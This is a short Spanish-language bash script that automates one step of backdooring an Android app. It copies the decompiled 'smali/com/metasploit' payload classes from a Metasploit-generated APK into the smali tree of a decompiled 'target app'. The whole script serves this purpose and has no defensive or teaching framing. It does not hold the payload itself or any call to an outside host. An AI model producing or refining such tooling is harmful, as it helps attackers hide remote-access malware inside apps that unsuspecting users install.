#!/bin/bash

# Colores
AMARILLO="\033[1;33m"
RESET="\033[0m"

clear
echo "=============================================="
echo "    MOVER CARPETA METASPLOIT AUTOMÁTICO     "
echo "=============================================="

# Pedir rutas al usuario
echo -ne "${AMARILLO}Introduce la carpeta DE DONDE sacar metasploit (apk generada): ${RESET}"
read origen

echo -ne "${AMARILLO}Introduce la carpeta DONDE va la app objetivo (ej: fighter): ${RESET}"
read destino

# Rutas completas
ORIGEN_FINAL="$origen/smali/com/metasploit"
DESTINO_FINAL="$destino/smali/com/"

# Verificar que exista la carpeta origen
if [ -d "$ORIGEN_FINAL" ]; then
    echo "[*] Encontrado: $ORIGEN_FINAL"
    
    # Crear la ruta smali/com/ si no existe
    mkdir -p "$DESTINO_FINAL"
    
    # Copiar solo la carpeta metasploit
    cp -r "$ORIGEN_FINAL" "$DESTINO_FINAL"
    
    echo "[+] ✅ HECHO!"
    echo "[✔] Creado: $DESTINO_FINAL/metasploit"
else
    echo "[-] ❌ NO SE ENCONTRÓ"
    echo "[!] Revisa que $origen/smali/com/ tenga la carpeta 'metasploit'"
fi

